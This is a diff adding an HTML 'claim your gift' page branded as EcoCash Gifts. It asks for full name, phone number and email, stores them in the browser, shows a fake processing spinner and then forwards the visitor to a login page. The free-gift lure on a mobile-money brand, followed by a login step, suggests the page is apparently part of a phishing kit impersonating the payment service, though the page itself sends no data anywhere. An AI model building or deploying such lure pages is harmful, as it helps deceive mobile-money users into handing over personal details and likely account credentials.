@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Gifts - Claim Your Gift</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f7fa;
+            overflow: hidden;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 16px;
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 14px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.06);
+        }
+        
+        .back-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            transition: transform 0.2s;
+        }
+        
+        .back-btn:hover {
+            transform: scale(1.1);
+        }
+        
+        .logo {
+            font-size: 20px;
+            font-weight: 800;
+        }
+        
+        .logo-eco {
+            color: #0066ff;
+        }
+        
+        .logo-cash {
+            color: #ff0000;
+        }
+        
+        .logo-gift {
+            color: #ff6b00;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 28px 24px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.06);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 160px);
+        }
+        
+        .gift-preview {
+            background: linear-gradient(135deg, #f0f4ff, #e8edf5);
+            border-radius: 16px;
+            padding: 16px 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 2px dashed #0066ff;
+        }
+        
+        .gift-preview .icon {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        
+        .gift-preview .name {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+        }
+        
+        .gift-preview .sub {
+            font-size: 13px;
+            color: #888;
+        }
+        
+        .form-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        
+        .form-subtitle {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+            font-size: 14px;
+        }
+        
+        .form-label .required {
+            color: #e74c3c;
+            margin-left: 2px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-family: 'Inter', sans-serif;
+            background: white;
+            color: #333;
+        }
+        
+        .form-input:focus {
+            border-color: #0066ff;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1);
+        }
+        
+        .form-input::placeholder {
+            color: #aaa;
+        }
+        
+        .invalid {
+            border-color: #e74c3c !important;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1) !important;
+            animation: shake 0.4s ease;
+        }
+        
+        @keyframes shake {
+            0%,
+            100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+        
+        .error-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            font-weight: 500;
+        }
+        
+        .error-text.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+        
+        @keyframes slideDown {
+            0% { opacity: 0; transform: translateY(-5px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+        }
+        
+        .back-btn-main {
+            flex: 0 0 auto;
+            padding: 14px 20px;
+            background: #f0f0f0;
+            color: #555;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+        }
+        
+        .back-btn-main:hover {
+            background: #e0e0e0;
+            transform: scale(1.02);
+        }
+        
+        .claim-btn {
+            flex: 1;
+            padding: 14px;
+            background: linear-gradient(135deg, #0066ff, #0052cc);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .claim-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 102, 255, 0.35);
+        }
+        
+        .claim-btn:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+        
+        .claim-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .claim-btn .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        footer {
+            padding: 16px;
+            color: #aaa;
+            font-size: 12px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+            margin-top: 8px;
+        }
+        
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px 16px;
+            }
+            .form-title {
+                font-size: 18px;
+            }
+            .back-btn-main {
+                padding: 12px 16px;
+                font-size: 13px;
+            }
+            .claim-btn {
+                font-size: 14px;
+                padding: 12px;
+            }
+            .gift-preview .icon {
+                font-size: 32px;
+            }
+            .gift-preview .name {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <button class="back-btn" onclick="goBack()">←</button>
+        <div class="logo">
+            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+            <span class="logo-gift">Gifts</span>
+        </div>
+        <div></div>
+    </header>
+
+    <main class="card">
+        <!-- Gift Preview -->
+        <div class="gift-preview">
+            <span class="icon" id="giftIcon">🎁</span>
+            <div class="name" id="giftName">Your Gift</div>
+            <div class="sub">You're about to claim this gift</div>
+        </div>
+
+        <h1 class="form-title">Personal Details</h1>
+        <p class="form-subtitle">Enter your details to claim your gift</p>
+
+        <!-- Full Name -->
+        <div class="form-group">
+            <label class="form-label">Full Name <span class="required">*</span></label>
+            <input type="text" class="form-input" id="fullName" placeholder="Enter your full name" required>
+            <div class="error-text" id="nameError">Please enter your full name (min 2 characters).</div>
+        </div>
+
+        <!-- Phone Number -->
+        <div class="form-group">
+            <label class="form-label">Phone Number <span class="required">*</span></label>
+            <input type="tel" class="form-input" id="phone" placeholder="+263 77 123 4567" required>
+            <div class="error-text" id="phoneError">Please enter a valid phone number (10+ digits).</div>
+        </div>
+
+        <!-- Email -->
+        <div class="form-group">
+            <label class="form-label">Email Address <span class="required">*</span></label>
+            <input type="email" class="form-input" id="email" placeholder="john@example.com" required>
+            <div class="error-text" id="emailError">Please enter a valid email address.</div>
+        </div>
+
+        <!-- Buttons -->
+        <div class="btn-group">
+            <button class="back-btn-main" onclick="goBack()">← BACK</button>
+            <button class="claim-btn" id="claimBtn">CLAIM GIFT</button>
+        </div>
+    </main>
+
+    <footer>© 2026 EcoCash Gifts • Share the joy 🎁</footer>
+
+    <script>
+        // ============================================
+        // GET GIFT DETAILS FROM LOCALSTORAGE
+        // ============================================
+        const giftName = localStorage.getItem('giftName') || 'Gift';
+        const giftIcon = localStorage.getItem('giftIcon') || '🎁';
+
+        document.getElementById('giftIcon').textContent = giftIcon;
+        document.getElementById('giftName').textContent = giftName;
+
+        console.log('🎁 Claiming:', giftName);
+
+        // ============================================
+        // PRE-FILL FROM LOCALSTORAGE
+        // ============================================
+        const savedName = localStorage.getItem('fullName');
+        const savedPhone = localStorage.getItem('phone');
+        const savedEmail = localStorage.getItem('email');
+
+        if (savedName) document.getElementById('fullName').value = savedName;
+        if (savedPhone) document.getElementById('phone').value = savedPhone;
+        if (savedEmail) document.getElementById('email').value = savedEmail;
+
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
+        const claimBtn = document.getElementById('claimBtn');
+
+        // ============================================
+        // VALIDATION FUNCTIONS
+        // ============================================
+        function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function validatePhone(phone) {
+            const cleaned = phone.replace(/\s/g, '');
+            return cleaned.length >= 10 && /^[\+\d\s-]+$/.test(phone);
+        }
+
+        function getErrorElements() {
+            return {
+                name: document.getElementById('nameError'),
+                phone: document.getElementById('phoneError'),
+                email: document.getElementById('emailError')
+            };
+        }
+
+        function getInputElements() {
+            return {
+                name: document.getElementById('fullName'),
+                phone: document.getElementById('phone'),
+                email: document.getElementById('email')
+            };
+        }
+
+        function resetErrors() {
+            const inputs = getInputElements();
+            const errors = getErrorElements();
+
+            Object.values(inputs).forEach(el => el.classList.remove('invalid'));
+            Object.values(errors).forEach(el => el.classList.remove('show'));
+        }
+
+        function showError(input, errorElement, message) {
+            input.classList.add('invalid');
+            errorElement.textContent = message || errorElement.textContent;
+            errorElement.classList.add('show');
+        }
+
+        // ============================================
+        // CLAIM HANDLER
+        // ============================================
+        claimBtn.addEventListener('click', function() {
+            const inputs = getInputElements();
+            const errors = getErrorElements();
+
+            const name = inputs.name.value.trim();
+            const phone = inputs.phone.value.trim();
+            const email = inputs.email.value.trim();
+
+            resetErrors();
+            let valid = true;
+
+            // Validate Name
+            if (!name || name.length < 2) {
+                showError(inputs.name, errors.name, 'Please enter your full name (min 2 characters).');
+                valid = false;
+            }
+
+            // Validate Phone
+            if (!phone || !validatePhone(phone)) {
+                showError(inputs.phone, errors.phone, 'Please enter a valid phone number.');
+                valid = false;
+            }
+
+            // Validate Email
+            if (!email || !validateEmail(email)) {
+                showError(inputs.email, errors.email, 'Please enter a valid email address.');
+                valid = false;
+            }
+
+            if (!valid) {
+                const firstError = document.querySelector('.invalid');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstError.focus();
+                }
+                return;
+            }
+
+            // Show loading state
+            claimBtn.disabled = true;
+            claimBtn.innerHTML = '<span class="loader"></span> PROCESSING...';
+
+            // Save to localStorage
+            localStorage.setItem('fullName', name);
+            localStorage.setItem('phone', phone);
+            localStorage.setItem('email', email);
+
+            // Navigate to login page after delay
+            setTimeout(() => {
+                window.location.href = 'login.html';
+            }, 1500);
+        });
+
+        // ============================================
+        // REAL-TIME VALIDATION
+        // ============================================
+        document.getElementById('fullName').addEventListener('input', function() {
+            if (this.value.trim().length >= 2) {
+                this.classList.remove('invalid');
+                document.getElementById('nameError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('phone').addEventListener('input', function() {
+            if (validatePhone(this.value.trim())) {
+                this.classList.remove('invalid');
+                document.getElementById('phoneError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('email').addEventListener('input', function() {
+            if (validateEmail(this.value.trim())) {
+                this.classList.remove('invalid');
+                document.getElementById('emailError').classList.remove('show');
+            }
+        });
+
+        // ============================================
+        // GO BACK FUNCTION
+        // ============================================
+        function goBack() {
+            const inputs = getInputElements();
+            localStorage.setItem('fullName', inputs.name.value.trim());
+            localStorage.setItem('phone', inputs.phone.value.trim());
+            localStorage.setItem('email', inputs.email.value.trim());
+            window.location.href = 'index.html';
+        }
+
+        // ============================================
+        // KEYBOARD SHORTCUTS
+        // ============================================
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 'Enter') {
+                claimBtn.click();
+            }
+            if (e.key === 'Escape') {
+                goBack();
+            }
+        });
+
+        // ============================================
+        // AUTO-FOCUS
+        // ============================================
+        window.addEventListener('load', () => {
+            if (!document.getElementById('fullName').value) {
+                document.getElementById('fullName').focus();
+            }
+        });
+
+        console.log('🎁 EcoCash Gifts - Claim Page Loaded');
+        console.log('📝 Gift:', giftName);
+    </script>
+
+</body>
+
+</html>
